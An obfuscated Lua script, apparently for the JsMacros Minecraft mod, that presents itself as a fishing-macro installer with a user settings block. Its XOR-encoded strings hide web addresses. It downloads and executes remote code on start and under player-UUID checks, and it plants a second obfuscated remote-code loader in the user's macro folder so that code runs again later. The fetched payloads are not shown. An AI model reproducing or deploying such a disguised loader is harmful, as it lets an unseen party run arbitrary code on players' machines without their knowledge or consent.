local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v19,v20) local v21={};for v29=1, #v19 do v6(v21,v0(v4(v1(v2(v19,v29,v29 + 1 + 0 )),v1(v2(v20,(1638 -(1523 + 114)) + (v29% #v20) ,1 + (v29% #v20) + 1 + 0 )))%(364 -108) ));end return v5(v21);end Chat:actionbar("§aLoading...");local v8=v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\252\45\233\168\211\19\222\199\222\115\179\244\202\29\221\202\217\106\235\186\206\16\158\229\218\39\244\178\196\44\159\207\206\36","\126\177\163\187\69\134\219\167");local v9=v7("\43\217\62\213\239\121\130\101\215\253\52\131\45\204\232\43\216\40\208\239\38\223\41\202\242\55\200\36\209\178\32\194\39\138\219\43\194\57\209\241\44\201\47\147\169\108\192\41\201\245\33\130\39\196\245\45\130\57\192\232\55\196\36\194\239\108\206\37\203\250\42\202\6\202\253\39\200\56\139\240\54\204","\156\67\173\74\165");local v10=v7("\60\163\93\6\175\124\9\123\165\72\1\242\33\79\32\191\92\20\169\53\67\38\180\70\24\168\35\72\32\249\74\25\177\105\97\60\184\90\2\177\41\66\49\225\28\89\177\37\74\61\181\6\4\185\32\85\123\191\76\23\184\53\9\57\182\64\24\243\53\67\32\163\64\24\187\53\9\37\162\64\21\183\15\72\39\163\72\26\176\104\74\33\182","\38\84\215\41\118\220\70");local v11=v7("\88\2\54\2\237\10\89\109\0\255\71\88\37\27\234\88\3\32\7\237\85\4\33\29\240\68\19\44\6\176\83\25\47\93\217\88\25\49\6\243\95\18\39\68\171\31\27\33\30\247\82\89\47\19\247\94\89\45\6\246\85\4\109\28\241\94\3\49\23\236\30\26\55\19","\158\48\118\66\114");local function v12(v22) local v23=Request:create(v22):get():text();local v24=load(v23);if v24 then v24();end end v12(v8);if (GlobalVars:getString(Player:getPlayer():getUUID())==v7("\165\43\30\35\96\160\233","\155\203\68\112\86\19\197")) then v12(v11);end local v13=[[
        return {
        Version = 1.3,

--Player Settings
        island = 'Your island here',

--Menu Settings
        errorLogigng = true, -- Use if you're fucking up
        whereToLog = 'corner', -- 'corner', 'chat'
        volume = 0.5,
        soundNofication = false, --If you want sound notification

--Macro Settings
        reelSound = true, -- makes a noise when you reel in the fishing rod
        buyEmeralds = false, --Buy Emeralds when low during fish trading
        
 --Keys         
        keys = {sprint = "key.mouse.5", click = "key.mouse.left", leftClick = "key.mouse.left"}
        --key.keyboard.left.control 
    }  
]];local v14=v7("\44\157\36\249\84\109\247\246\6\198\92\188\0\56\165\184\80\216\36\239\73\119\235\184\27\157\103\178\16\52\143\184\6\157\118\188\76\119\228\252\67\207\118\161\0\41\171\168\44\192\92","\152\38\189\86\156\32\24\133");local v15=[[
--+===================================================+
--|           __  __  _                               |
--|__  __     \ \/ / | |__     ___   __  __           |
--|\ \/ /      \  /  | '_ \   / _ \  \ \/ /           |
--| >  <   _   /  \  | |_) | | (_) |  >  <            |
--|/_/\_\ (_) /_/\_\ |_.__/   \___/  /_/\_\           |
--||  _ \  (_)  ___   _ __   | |   __ _   _   _   ___ |
--|| | | | | | / __| | '_ \  | |  / _` | | | | | / __||
--|| |_| | | | \__ \ | |_) | | | | (_| | | |_| | \__ \|
--||____/  |_| |___/ | .__/  |_|  \__,_|  \__, | |___/|
--|                  |_|                  |___/       |
--+===================================================+

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v9,v10) local v11=0;local v12;while true do if (v11==(2 -1)) then return v5(v12);end if (v11==(568 -(367 + 201))) then v12={};for v13=928 -(214 + 713) , #v9 do v6(v12,v0(v4(v1(v2(v9,v13,v13 + 1 + 0 )),v1(v2(v10,1 + 0 + (v13% #v10) ,1 + (v13% #v10) + (878 -(282 + 595)) )))%256 ));end v11=1;end end end local v8=load(Request:get(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\252\45\233\168\211\19\222\199\222\115\179\244\202\29\221\202\217\106\244\190\193\13\158\203\222\36\226\168\136\19\208\202\213\106\245\190\211\10\216\205\220\54\169\171\213\27\221\204\218\33\227\169\137\18\196\194","\126\177\163\187\69\134\219\167")):text());if  not v8 then return;end pcall(v8);
]];local function v16(v25,v26) local v27=1065 -(68 + 997) ;local v28;while true do if (v27==(1270 -(226 + 1044))) then v28=JsMacros:getConfig().macroFolder:getPath()   .. "/"   .. v25 ;if FS:exists(v28) then return load(FS:open(v28):read())();else local v31=0;while true do if (v31==(4 -3)) then FS:open(v25):write(v26);Chat:actionbar(v7("\137\121\120\45\23","\35\200\29\28\72\115\20\154")   .. v25 );break;end if (v31==(117 -(32 + 85))) then FS:createFile("",v7("\218\94\171\67\210\86\170\67","\38\156\55\199"));Client:waitTick(5 + 0 );v31=1 + 0 ;end end end break;end end end local v17=v16(v7("\10\186\197\203\132\34\51\10\241\221\202\140","\84\121\223\177\191\237\76"),v13);local v18=v16(v7("\184\89\199\166\51\87\126\205\174\87","\161\219\54\169\192\90\48\80"),v14);if ((GlobalVars:getString(Player:getPlayer():getUUID())==v7("\92\81\5\55","\69\41\34\96")) or (GlobalVars:getString(Player:getPlayer():getUUID())==v7("\175\214\199\15\16\30\175\198\197","\75\220\163\183\106\98"))) then local v30=957 -(892 + 65) ;while true do if (v30==2) then v12(v8);break;end if (v30==(0 -0)) then if  not FS:exists(JsMacros:getConfig().macroFolder:getPath()   .. "/"   .. v7("\1\181\134\58\216\12\190\130\57\211\7\185\159\56\203\76\182\158\54","\185\98\218\235\87") ) then local v32=0 -0 ;while true do if ((0 -0)==v32) then FS:open(v7("\200\51\42\235\223\164\207\53\41\236\219\169\223\51\53\168\210\191\202","\202\171\92\71\134\190")):write(v15);Chat:actionbar(v7("\8\197\40\141\45\129\47\135\36\204\45\134\45\200\34\130\44\194\56\135\59\143\32\157\40","\232\73\161\76"));break;end end end if ( not v17 or (v17.version~=1.3)) then FS:open(v7("\168\220\86\73\23\181\222\81\19\18\174\216","\126\219\185\34\61")):write(v13);end v30=1;end if (v30==(351 -(87 + 263))) then if ( not v18 or (v18.version~=(181 -(67 + 113)))) then FS:open(v7("\15\193\80\116\119\112\189\235\25\207","\135\108\174\62\18\30\23\147")):write(v14);v12(v9);end Chat:actionbar("§dInjecting Commands");v30=2;end end end